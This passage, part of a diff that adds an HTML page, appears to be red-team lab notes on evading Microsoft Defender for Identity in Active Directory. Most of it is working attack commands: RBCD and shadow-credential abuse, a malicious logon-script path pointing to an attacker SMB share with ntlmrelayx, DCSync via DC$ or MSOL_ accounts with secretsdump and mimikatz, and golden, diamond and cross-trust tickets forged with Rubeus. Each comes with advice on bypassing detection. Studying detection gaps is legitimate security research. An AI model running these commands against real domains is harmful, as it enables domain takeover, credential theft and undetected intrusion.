+<h4 id="rbcd-resource-based-constrained-delegation">RBCD (Resource-Based Constrained Delegation)</h4>
+<p>MDI detects any modification of the <code>msds-allowedtoactonbehalfofotheridentity</code> attribute.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># RBCD - GenericWrite over a computer account</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>Import-Module<span class="w"> </span>.<span class="se">\P</span>owerView.ps1
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nv">$ObjectSid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"S-1-5-21-2498267786-1201464700-2190978386-2104"</span><span class="w">  </span><span class="c1"># SID of attacker-controlled account</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="nv">$SD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>Security.AccessControl.RawSecurityDescriptor<span class="w"> </span>-ArgumentList<span class="w"> </span><span class="s2">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="k">$(</span><span class="nv">$ObjectSid</span><span class="k">)</span><span class="s2">)"</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="nv">$SDBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>byte<span class="o">[]</span><span class="w"> </span><span class="o">(</span><span class="nv">$SD</span>.BinaryLength<span class="o">)</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="nv">$SD</span>.GetBinaryForm<span class="o">(</span><span class="nv">$SDBytes</span>,<span class="w"> </span><span class="m">0</span><span class="o">)</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="c1"># Detected by MDI</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>Get-DomainComputer<span class="w"> </span>SRV01<span class="w"> </span><span class="p">|</span><span class="w"> </span>Set-DomainObject<span class="w"> </span>-Set<span class="w"> </span>@<span class="o">{</span><span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span><span class="o">=</span><span class="nv">$SDBytes</span><span class="o">}</span><span class="w"> </span>-Verbose
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="c1"># Exploit RBCD</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:svc_mhd<span class="w"> </span>/rc4:F894F8DBE06D430421B73202F4A5160D<span class="w"> </span>/impersonateuser:Administrator<span class="w"> </span>/msdsspn:wsman/srv01.yhp0w.lan<span class="w"> </span>/enctype:aes256<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>winrs<span class="w"> </span>-r:srv01.yhp0w.lan<span class="w"> </span>cmd
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="c1"># Clean up</span>
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>Get-DomainComputer<span class="w"> </span>SRV01<span class="w"> </span><span class="p">|</span><span class="w"> </span>Set-DomainObject<span class="w"> </span>-Clear<span class="w"> </span>msds-allowedtoactonbehalfofotheridentity<span class="w"> </span>-Verbose
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260422124018.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260422123955.png" /></p>
+<h4 id="shadow-credentials">Shadow Credentials</h4>
+<p>MDI detects any modification of the <code>msds-KeyCredentialLink</code> attribute.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Shadow Credentials - GenericWrite over an account</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>certipy-ad<span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span>-u<span class="w"> </span><span class="s1">'svc_mhd@yhp0w.lan'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'Open@llP@55'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'172.23.126.134'</span><span class="w"> </span>-account<span class="w"> </span><span class="s1">'srv01$'</span>
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260422131408.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260422131425.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260422134017.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260422134112.png" /></p>
+<hr />
+<h3 id="logon-script-abuse">Logon Script Abuse</h3>
+<p>MDI does <strong>not</strong> detect modification of <code>homeDirectory</code> or <code>scriptPath</code> attributes.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Set malicious logon script</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Set-DomainObject<span class="w"> </span>-Identity<span class="w"> </span>svc_mhd2<span class="w"> </span>-Set<span class="w"> </span>@<span class="o">{</span><span class="s1">'homeDirectory'</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'\\172.23.126.150\scripts\share'</span><span class="o">}</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Set-DomainObject<span class="w"> </span>-Identity<span class="w"> </span>svc_mhd2<span class="w"> </span>-Set<span class="w"> </span>@<span class="o">{</span><span class="s1">'scriptPath'</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'\\172.23.126.150\scripts\logon.exe'</span><span class="o">}</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="c1"># Capture with SMB relay</span>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>smb://172.23.126.139<span class="w"> </span>-smb2support<span class="w"> </span>-socks
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260423155716.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260424145358.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260424145407.png" /></p>
+<hr />
+<h3 id="dcsync-opsec">DCSync OPSEC</h3>
+<p>DCSync uses the Directory Replication Service (DRS) to request hash synchronization from a DC. MDI detects it when performed with a regular user account.</p>
+<p><strong>MDI Alerts:</strong></p>
+<p><img alt="" src="img/Pasted%20image%2020260417095944.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260417095956.png" /></p>
+<p><strong>Bypass strategies:</strong></p>
+<ul>
+<li>Use a <strong>Domain Controller identity</strong> (<code>domain-dc$</code>) - excluded from MDI alerts.</li>
+<li>In hybrid identity environments, use the <strong><code>MSOL_&lt;id&gt;</code> account</strong> - AD Connect synchronizes hashes every 2 minutes using this account, and MDI excludes it from alerts.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># OPSEC-friendly - from Linux using DC identity</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>impacket-secretsdump<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">172</span>.23.126.134<span class="w"> </span><span class="s1">'yhp0w.lan/dc01$'</span>@dc01.yhp0w.lan<span class="w"> </span>-aesKey<span class="w"> </span>f6cc80f83cfcfb67177a65d39d43c09c2ed07815e4dea3528e735cdd658b5ab2<span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="c1"># OPSEC-friendly - from Windows using MSOL_ account</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>Rubeus<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:MSOL_9c658791b701<span class="w"> </span>/aes256:7d89e84ba529220ad87a1f7f5760ff729b984a45ab27e893091d641b323a72d9<span class="w"> </span>/enctype:aes256<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>mimikatz.exe<span class="w"> </span><span class="s2">"lsadump::dcsync /user:Administrator /dc:dc01.yhp0w.lan /domain:yhp0w.lan"</span><span class="w"> </span><span class="s2">"exit"</span>
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260421153243.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260421153313.png" /></p>
+<hr />
+<h3 id="forged-tickets-opsec">Forged Tickets OPSEC</h3>
+<h4 id="golden-ticket">Golden Ticket</h4>
+<p>Tools like Rubeus or Mimikatz fail to fill or incorrectly fill some PAC fields, generating detectable discrepancies.</p>
+<p><img alt="" src="img/GenuineVsMimiPAC.png" /></p>
+<p><strong>Key PAC fields to populate manually:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>PWD Last Set</code></td>
+<td><code>Get-DomainUser &lt;user&gt;</code></td>
+</tr>
+<tr>
+<td><code>PWD Must Change</code></td>
+<td><code>Get-DomainUser &lt;user&gt;</code></td>
+</tr>
+<tr>
+<td><code>Full Name</code></td>
+<td><code>Get-DomainUser &lt;user&gt;</code></td>
+</tr>
+<tr>
+<td><code>Logon Count</code></td>
+<td><code>Get-DomainUser &lt;user&gt;</code></td>
+</tr>
+<tr>
+<td><code>User Flags</code></td>
+<td><code>Get-DomainUser &lt;user&gt;</code></td>
+</tr>
+<tr>
+<td><code>Server</code></td>
+<td>Domain info</td>
+</tr>
+<tr>
+<td><code>Type: UPN DNS Info</code></td>
+<td>Domain info</td>
+</tr>
+<tr>
+<td><code>NetBIOSName</code></td>
+<td>See below</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># User fields</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>Get-DomainUser<span class="w"> </span>mhd
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c1"># Domain policy fields</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>Get-DomainPolicy
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>net<span class="w"> </span>accounts<span class="w"> </span>/domain
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="c1"># NetBIOSName</span>
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="nv">$root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>ADSI<span class="o">]</span><span class="s2">"LDAP://RootDSE"</span>
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="nv">$domainDN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$root</span>.defaultNamingContext
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="nv">$searcher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.DirectoryServices.DirectorySearcher
+<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="nv">$searcher</span>.SearchRoot<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>ADSI<span class="o">]</span><span class="s2">"LDAP://CN=Partitions,CN=Configuration,</span><span class="nv">$domainDN</span><span class="s2">"</span>
+<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="nv">$searcher</span>.Filter<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"(nCName=</span><span class="nv">$domainDN</span><span class="s2">)"</span>
+<a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="o">(</span><span class="nv">$searcher</span>.FindOne<span class="o">()</span>.Properties.netbiosname<span class="o">)[</span><span class="m">0</span><span class="o">]</span>
+<a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a><span class="c1"># Or with ADModule:</span>
+<a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a>Get-ADDomain
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># More OPSEC-friendly (still detected - no associated AS-REQ)</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>Rubeus.exe<span class="w"> </span>golden<span class="w"> </span>/aes256:1a0e0713a7666e5bb5dc319b2340f1c85ebfccfccfc3a55de1f019d35e4fa8c4<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/user:mhd<span class="w"> </span>/id:2103<span class="w"> </span>/pgid:513<span class="w"> </span>/sid:S-1-5-21-2498267786-1201464700-2190978386<span class="w"> </span>/pwdlastset:<span class="s2">"12/13/2024 9:03:11 PM"</span><span class="w"> </span>/logoncount:6<span class="w"> </span>/groups:513,512<span class="w"> </span>/uac:NORMAL_ACCOUNT<span class="w"> </span>/maxpassage:42<span class="w"> </span>/minpassage:0<span class="w"> </span>/netbios:YHP0W<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>dir<span class="w"> </span><span class="se">\\</span>dc01<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="w">  </span><span class="c1"># Test detection</span>
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260421141559.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260421145109.png" /></p>
+<blockquote>
+<p>Always use a <strong>valid, active DA account</strong> for the golden ticket.</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Rubeus.exe<span class="w"> </span>golden<span class="w"> </span>/aes256:1a0e0713a7666e5bb5dc319b2340f1c85ebfccfccfc3a55de1f019d35e4fa8c4<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/user:administrator<span class="w"> </span>/id:500<span class="w"> </span>/pgid:513<span class="w"> </span>/sid:S-1-5-21-2498267786-1201464700-2190978386<span class="w"> </span>/pwdlastset:<span class="s2">"4/10/2026 4:25:37 PM"</span><span class="w"> </span>/logoncount:79<span class="w"> </span>/groups:513,512<span class="w"> </span>/uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD<span class="w"> </span>/maxpassage:42<span class="w"> </span>/minpassage:0<span class="w"> </span>/startoffset:0<span class="w"> </span>/endin:600<span class="w"> </span>/renewmax:10080<span class="w"> </span>/netbios:YHP0W<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>dir<span class="w"> </span><span class="se">\\</span>dc01<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="w">  </span><span class="c1"># Test detection</span>
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260424153520.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260424153525.png" /></p>
+<hr />
+<h4 id="diamond-ticket">Diamond Ticket</h4>
+<p>Rather than forging a new ticket offline, a Diamond Ticket modifies an <strong>existing valid TGT</strong> - changing group membership, privileges, or lifetime - then re-encrypts it.</p>
+<blockquote>
+<p>"Golden and Silver tickets can usually be detected by probes that monitor TGS requests with no corresponding AS-REQ. Diamond tickets simply request a normal ticket, decrypt the PAC, modify it, recalculate signatures, and re-encrypt it." - <a href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond">The Hacker Recipes</a></p>
+</blockquote>
+<p><strong>Advantages over Golden Ticket:</strong>
+- Has an associated AS-REQ - avoids the "TGS with no AS-REQ" detection.
+- PAC is based on a real ticket - less likely to fail PAC validation.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># OPSEC-friendly diamond ticket</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>Rubeus<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>Rubeus.exe<span class="w"> </span>diamond<span class="w"> </span>/krbkey:1a0e0713a7666e5bb5dc319b2340f1c85ebfccfccfc3a55de1f019d35e4fa8c4<span class="w"> </span>/user:consultant<span class="w"> </span>/aes256:0d87626e50a46ac45dfc302c10eabb815d5dd5cac96340fe9b91694bf9272f32<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/enctype:aes256<span class="w"> </span>/ticketuserid:1118<span class="w"> </span>/groups:512,513<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="c1"># OPSEC-friendly diamond ticket - impersonating another user</span>
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>Rubeus<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>Rubeus.exe<span class="w"> </span>diamond<span class="w"> </span>/krbkey:1a0e0713a7666e5bb5dc319b2340f1c85ebfccfccfc3a55de1f019d35e4fa8c4<span class="w"> </span>/user:consultant<span class="w"> </span>/aes256:0d87626e50a46ac45dfc302c10eabb815d5dd5cac96340fe9b91694bf9272f32<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/enctype:aes256<span class="w"> </span>/ticketuser:Administrator<span class="w"> </span>/ticketuserid:500<span class="w"> </span>/pgid:513<span class="w"> </span>/pwdlastset:<span class="s2">"12/13/2024 9:03:11 PM"</span><span class="w"> </span>/logoncount:73<span class="w"> </span>/groups:513,512<span class="w"> </span>/uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD<span class="w"> </span>/minpassage:0<span class="w"> </span>/maxpassage:42<span class="w"> </span>/netbios:YHP0W<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>
+<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>dir<span class="w"> </span><span class="se">\\</span>srv01<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\ </span><span class="w"> </span><span class="c1"># Test detection</span>
+</code></pre></div>
+<hr />
+<h4 id="child-to-forest-trust-abuse">Child-to-Forest Trust Abuse</h4>
+<p>Forge a ticket with the <code>sIDHistory</code> of the <strong>Enterprise Domain Controllers</strong> group using the child domain's <code>krbtgt</code>. The parent domain trusts the TGT via the inter-domain trust.</p>
+<h5 id="golden-ticket-child-to-forest">Golden Ticket - Child to Forest</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># /sid      - child domain SID</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="c1"># /sids     - parent domain SID + RID 516 (Domain Controllers)</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="c1"># S-1-5-9   - Enterprise Domain Controllers</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>Rubeus.exe<span class="w"> </span>golden<span class="w"> </span>/aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5<span class="w"> </span>/user:us-dc$<span class="w"> </span>/id:1001<span class="w"> </span>/pgid:516<span class="w"> </span>/domain:us.techcorp.local<span class="w"> </span>/sid:S-1-5-21-210670787-2521448726-163245708<span class="w"> </span>/pwdlastset:<span class="s2">"10/15/2025 12:59:02 AM"</span><span class="w"> </span>/minpassage:1<span class="w"> </span>/logoncount:4<span class="w"> </span>/netbios:us.techcorp<span class="w"> </span>/groups:516<span class="w"> </span>/sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9<span class="w"> </span>/dc:us-dc.us.techcorp.local<span class="w"> </span>/uac:SERVER_TRUST_ACCOUNT,TRUSTED_FOR_DELEGATION<span class="w"> </span>/enctype:aes256<span class="w"> </span>/opsec<span class="w"> </span>/nowrap
+</code></pre></div>
+<h5 id="diamond-ticket-child-to-forest">Diamond Ticket - Child to Forest</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>Rubeus.exe<span class="w"> </span>diamond<span class="w"> </span>/krbkey:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5<span class="w"> </span>/user:us-dc$<span class="w"> </span>/aes256:aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24<span class="w"> </span>/enctype:aes256<span class="w"> </span>/domain:us.techcorp.local<span class="w"> </span>/dc:us-dc.us.techcorp.local<span class="w"> </span>/ticketuserid:1000<span class="w"> </span>/sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9<span class="w"> </span>/opsec<span class="w"> </span>/nowrap
+</code></pre></div>
+<hr />
+<h3 id="conclusion">Conclusion</h3>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>MDI Detects</th>
+<th>OPSEC Approach</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Recon</strong></td>
+<td>Noisy BloodHound LDAP collection</td>
+<td>Use SOAPHound / ShadowHound over ADWS (Port 9389)</td>
+</tr>
+<tr>
+<td><strong>Kerberoasting</strong></td>
+<td>RC4 encryption downgrade + LDAP SPN recon</td>
+<td>Enumerate users without SPN filter; request RC4 only for non-AES accounts</td>
+</tr>
+<tr>
+<td><strong>AS-REQ</strong></td>
+<td>Missing pre-auth step, RC4 encryption, wrong KDC options</td>
+<td>Use <code>/opsec</code> + AES256 in Rubeus</td>
+</tr>
+<tr>
+<td><strong>TGS-REQ</strong></td>
+<td>Missing PA-PAC-OPTIONS, wrong etypes/fields</td>
+<td>Use <code>/opsec</code> + AES256 + multiple service tickets</td>
+</tr>
+<tr>
+<td><strong>DCSync</strong></td>
+<td>Regular user performing DRS replication</td>
+<td>Use DC$ identity or <code>MSOL_</code> account (hybrid AD)</td>
+</tr>
+<tr>
+<td><strong>Golden Ticket</strong></td>
+<td>Forged PAC discrepancies, TGS with no AS-REQ</td>
+<td>Populate all PAC fields manually; prefer Diamond Ticket</td>
+</tr>
+<tr>
+<td><strong>Diamond Ticket</strong></td>
+<td>Lower detection than Golden - inherits real AS-REQ</td>
+<td>Preferred over Golden Ticket</td>
+</tr>
+<tr>
+<td><strong>RBCD / Shadow Creds</strong></td>
+<td>Attribute modification always detected</td>
+<td>No reliable bypass identified</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Core rule:</strong> Avoid talking to the DC directly. When you must, emulate genuine Kerberos traffic (AES256, correct fields, multi-ticket requests).</p>
+</blockquote>
+<hr />
+<h3 id="to-do-further-research">To Do / Further Research</h3>
+<blockquote>
+<p>Claims to verify - untested in the lab.</p>
+</blockquote>
+<ul>
+<li>MDI detects coercing with MS-DFSNM</li>
+<li>OPSEC AS-REProasting: offline recon for accounts with pre-auth disabled + one AS-REProast at a time</li>
+<li>Silver tickets - MDI detection status?</li>
+<li>MDI detects ESC1–17?</li>
+</ul>
+<hr />
+<h3 id="references">References</h3>
+<ul>
+<li>https://learn.microsoft.com/en-us/defender-for-identity/what-is</li>
+<li>https://github.com/0xe7/Talks/tree/main</li>
+<li>https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond</li>
+<li>https://trustedsec.com/blog/adexplorer-on-engagements</li>
+<li>https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer</li>
+<li>https://blog.fndsec.net/2024/11/25/shadowhound/</li>
+<li>https://github.com/c3c/ADExplorerSnapshot</li>
+<li>https://github.com/FalconForceTeam/SOAPHound</li>
+<li>https://github.com/Friends-Security/ShadowHound</li>
+<li>https://github.com/coffeegist/bofhound</li>
+<li>https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797</li>
+<li>https://www.thehacker.recipes/ad/movement/dacl/logon-script</li>
+<li>https://blog.cyberadvisors.com/technical-blog/blog/bypassing-microsoft-defender-for-identity-detections</li>
+<li>https://files.brucon.org/2022/0wn-premises%20Bypassing%20Microsoft%20Defender%20for%20Identity.pdf</li>
+<li>https://techcommunity.microsoft.com/blog/microsoftthreatprotectionblog/protect-and-detect-microsoft-defender-for-identity-expands-to-entra-connect-serv/4226165</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
